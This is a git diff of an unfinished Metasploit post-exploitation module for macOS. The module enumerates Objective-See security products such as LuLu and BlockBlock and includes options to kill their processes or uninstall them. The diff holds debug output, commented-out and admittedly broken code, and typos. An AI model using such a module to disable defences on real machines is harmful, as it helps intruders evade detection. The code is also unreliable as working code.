@@ -23,6 +23,7 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'gardnerapp' ],
         'Platform' => [ 'osx' ],
+        'SessionTypes' => 'meterpreter', # ˇTODO test on non-meterpreter sessions
         'URL' => [
           'https://objective-see.org/tools.html'
         ]
@@ -31,8 +32,9 @@ class MetasploitModule < Msf::Post
   )
     register_options(
       [
+        OptBool.new('ENUMERATE_ONLY', [true, 'When set to true this module will only enumerate the system for Objective See products without disabling them. ']),
         OptBool.new('KILL_PROCESSES', [true, 'When enabled all PID\'s associated with the installed Objective See products will be sent a kill signal. ', false]),
-        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.'])
+        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.']),
       ]
     )
   end
@@ -52,8 +54,12 @@ class MetasploitModule < Msf::Post
 
       # so we can use the Metasploit API to interact with the session object
       @msf = msf
+      @name = name 
+      p (name)
+      # writing name this way is prettier and makes it easier to grab pid's of running processes
+      # no idea why this code is not running
+      # @name = name.delete_suffix!("Helper").delete_suffix!(".app")
 
-      @name = name
       @path = "/Applications/#{name}"
       @installed = installed?
 
@@ -66,10 +72,9 @@ class MetasploitModule < Msf::Post
       @installed = @msf.send :directory?, @path
     end
 
+    # Needs to be refactored.
     def pid
-      # may return more than one pid need to test
       @pid = @msf.send :pidof, @name
-      print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@name}"
     end
 
     def running?
@@ -77,34 +82,14 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # determine which products are installed and their ppid if any
+  # Determine which products are installed and their ppid if any
+  # Two BlockBlock processes are running BlockBlock Helper.app and BlockBlock.app
   def enumerate
-    # products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
-    # 'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
-    #  ObjectiveSee.new prod
-    # end
-
-    print_status "DEBUG: self is #{self} class: #{self.class}"
-    ObjectiveSee.new 'LuLu.app', self
-
-    # we only want the products installed on the system
-    # products = products.filter_map(&:installed?)
-    # products.each { |prod| print_status "#{prod.name} is installed." }
-
-    # determine which products are running.
-    # products.filter_map(&:running?)
-  end
-
-  def kill_pid(pid)
-    if !is_root?
-      fail_with(Failure::NoAcces, 'Can not disable products unless running as root.
-      Please escelate privlleges before re-running the module.')
+    products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
+    'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
+    ObjectiveSee.new prod, self
     end
-
-    kill_process pid
   end
-
-  def uninstall; end
 
   def run
     print_status('Enumerating Objective See security products.')
@@ -114,9 +99,28 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::NotFound,
                 'No Objective Cee products were found to be installed on the system.')
     else
-      print_good('The following Objective See products were found installed on the system.')
-      ObjectiveSee.installed_products.each { |prod| print_status(prod.name) }
+      print_good('The following Objective See products were found installed on the system:')
+      ObjectiveSee.installed_products.each { |prod| print_status(prod.name)}
     end
+
+    x = ObjectiveSee.installed_products.map {|p| p.name}
+
+    print_status x
+
+  # get_processes returns an array pf hashes, composed of the name of the program and the pid
+  # ex. [{"name"=>"configd", "pid"=>116},
+  # {"name"=>"logd", "pid"=>104},
+  # {"name"=>"UserEventAgent", "pid"=>106},
+  # {"name"=>"launchd", "pid"=>1}]
+
+   # get_processes.select do |elem|
+   #   elem['name'].include? 'BlockBlock'
+   # end 
+
+   # grep for installed products names
+
+
+    return if datastore['ENUMERATE_ONLY']
 
     # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']
 
